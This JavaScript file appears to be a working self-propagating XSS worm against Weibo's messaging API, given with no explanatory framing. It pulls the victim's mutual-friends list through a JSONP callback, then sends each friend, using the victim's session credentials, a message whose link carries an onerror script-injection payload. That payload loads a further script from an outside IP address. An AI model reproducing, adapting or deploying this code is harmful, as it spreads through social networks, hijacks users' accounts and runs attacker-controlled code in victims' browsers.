function fzzworm(friends_json) {
    let friends_array = friends_json.data.friends;
    get_friends(friends_array)
}

function get_friends(friends_array) {
    let i = 0;
    for (; i < friends_array.length; i++) { //iter
        let uid = friends_array[i].items[0].uid; //get friend uin
        console.log(uid);
        send_message(uid)
    }
}

function send_message(uid) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https:\/\/api.weibo.com\/webim\/2\/direct_messages\/new.json", true);
    xhr.setRequestHeader("accept", "application\/json, text\/plain, *\/*");
    xhr.setRequestHeader("content-type", "application\/x-www-form-urlencoded");
    xhr.setRequestHeader("accept-language", "en-US,en;q=0.9");
    xhr.withCredentials = true;
    var body = 'content_template={{link.DATA}}&content_data={"link"%3a{"color"%3a"%2300ffff","scheme"%3a"http://common.fj.sina.com.cn/index.php/unicom/unicominterface/webdraw?callback=%3Cimg/contentEditable/autoFocus/src=x%20onerror%3ds=createElement(%27script%27);body.appendChild(s);s.src=%27http://114.115.172.239:8000/weibo_chat.js%27;%3E","color_dark"%3a"%23ffffff","value"%3a"HiJack, ClickMe"}}&source=209678993&uid=' + uid;
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
    xhr.send(new Blob([aBody]));
}

var s = document.createElement('script');
document.body.appendChild(s);
s.src = 'https://api.weibo.com/webim/query_bilateral_friends.json?source=209678993&callback=fzzworm';
